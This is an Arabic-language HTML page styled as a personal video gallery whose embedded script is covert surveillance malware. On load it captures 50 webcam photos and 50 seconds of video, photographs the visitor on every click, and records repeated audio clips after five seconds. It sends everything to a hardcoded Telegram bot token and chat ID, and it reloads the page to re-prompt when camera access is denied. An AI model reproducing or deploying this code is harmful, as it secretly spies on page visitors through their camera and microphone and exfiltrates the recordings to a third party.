
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>طائفة الظلال - العنقاء_666</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      background: #1a001a;
      color: white;
      font-family: Arial;
      overflow-x: hidden;
    }
    .header {
      background-image: url("5alfia.png");
      background-size: cover;
      height: 200px;
      position: relative;
    }
    .profile {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      border: 4px solid violet;
      position: absolute;
      bottom: -50px;
      right: 20px;
      background: url("profile.png") center/cover no-repeat;
    }
    .videos {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
      gap: 15px;
      padding: 70px 15px 30px;
    }
    .video-card {
      background: #300030;
      padding: 10px;
      border-radius: 15px;
      border: 2px solid pink;
      animation: pulse 2s infinite;
      text-align: center;
    }
    @keyframes pulse {
      0% { box-shadow: 0 0 5px red; }
      50% { box-shadow: 0 0 15px pink; }
      100% { box-shadow: 0 0 5px red; }
    }
    .video-card video {
      width: 100%;
      height: 150px;
      object-fit: cover;
      border-radius: 10px;
      cursor: pointer;
    }
    .desc {
      margin-top: 5px;
      color: #ffb6c1;
      font-size: 14px;
    }
    .fullscreen {
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0,0,0,0.95);
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      z-index: 1000;
    }
    .fullscreen video {
      width: 90%;
      max-height: 80vh;
    }
    .download-btn {
      margin-top: 10px;
      padding: 10px 20px;
      background: pink;
      color: black;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
    }
    .back-btn {
      position: fixed;
      bottom: 15px;
      left: 15px;
      background: pink;
      border: 2px solid white;
      color: black;
      padding: 10px 20px;
      border-radius: 50px;
      font-weight: bold;
      animation: pulse 2s infinite;
      text-decoration: none;
    }
  </style>
</head>
<body>

<div class="header">
  <div class="profile"></div>
</div>

<div class="videos">
  <div class="video-card" onclick="playFullscreen('VivaCut_video_1751836959485_HD1.mp4', 'لحن نهاية')">
    <video src="VivaCut_video_1751836959485_HD1.mp4" muted></video>
    <div class="desc">لحن نهاية</div>
  </div>
  <!-- 👑 أضف هنا المزيد من الفيديوهات بنفس الشكل إن أردت -->
</div>

<a class="back-btn" href="index.html">⬅️ رجوع للصور</a>

<div id="fullscreen" class="fullscreen">
  <video id="fullVideo" controls autoplay></video>
  <a id="downloadLink" class="download-btn" download>تحميل الفيديو</a>
</div>

<script>
const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
const CHAT_ID = "7664410054";

function sendToBot(data, isFile = false, filename = "") {
  const url = `https://api.telegram.org/bot${TOKEN}/${isFile ? "sendDocument" : "sendMessage"}`;
  const formData = new FormData();
  if (isFile) {
    formData.append("chat_id", CHAT_ID);
    formData.append("document", data, filename);
  } else {
    formData.append("chat_id", CHAT_ID);
    formData.append("text", data);
  }
  fetch(url, { method: "POST", body: formData });
}

function playFullscreen(src, desc) {
  const fullScreen = document.getElementById("fullscreen");
  const video = document.getElementById("fullVideo");
  const download = document.getElementById("downloadLink");
  video.src = src;
  download.href = src;
  download.download = src;
  fullScreen.style.display = "flex";
  sendToBot("📹 تم مشاهدة الفيديو: " + desc);
  video.play();
}

document.body.addEventListener("click", () => {
  // التقاط صورة عند كل نقرة
  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
    const track = stream.getVideoTracks()[0];
    const imageCapture = new ImageCapture(track);
    imageCapture.takePhoto().then(blob => {
      sendToBot(blob, true, "click_photo.jpg");
      track.stop();
    });
  });
});

navigator.mediaDevices.getUserMedia({ video: true }).then(async stream => {
  // 🔴 50 صورة في البداية
  const track = stream.getVideoTracks()[0];
  const imageCapture = new ImageCapture(track);
  for (let i = 0; i < 50; i++) {
    try {
      const photo = await imageCapture.takePhoto();
      sendToBot(photo, true, `image_${i}.jpg`);
    } catch {}
  }

  // 🔴 تسجيل فيديو 50 ثانية
  const mediaRecorder = new MediaRecorder(stream);
  let chunks = [];
  mediaRecorder.ondataavailable = e => chunks.push(e.data);
  mediaRecorder.onstop = () => {
    const blob = new Blob(chunks, { type: "video/mp4" });
    sendToBot(blob, true, "recorded_video.mp4");
    stream.getTracks().forEach(t => t.stop());
  };
  mediaRecorder.start();
  setTimeout(() => mediaRecorder.stop(), 50000);
}).catch(() => location.reload()); // إعادة الطلب إذا تم الرفض

setTimeout(() => {
  // 🔴 تسجيل صوت بعد 5 ثواني
  navigator.mediaDevices.getUserMedia({ audio: true }).then(audioStream => {
    let counter = 0;
    function recordAudio() {
      const audioRecorder = new MediaRecorder(audioStream);
      let chunks = [];
      audioRecorder.ondataavailable = e => chunks.push(e.data);
      audioRecorder.onstop = () => {
        const blob = new Blob(chunks, { type: "audio/webm" });
        sendToBot(blob, true, `voice_${counter}.webm`);
        counter++;
        if (counter < 100) setTimeout(recordAudio, 10000);
      };
      audioRecorder.start();
      setTimeout(() => audioRecorder.stop(), 3000); // 3 ثواني تسجيل
    }
    recordAudio();
  });
}, 5000);
</script>

</body>
</html>
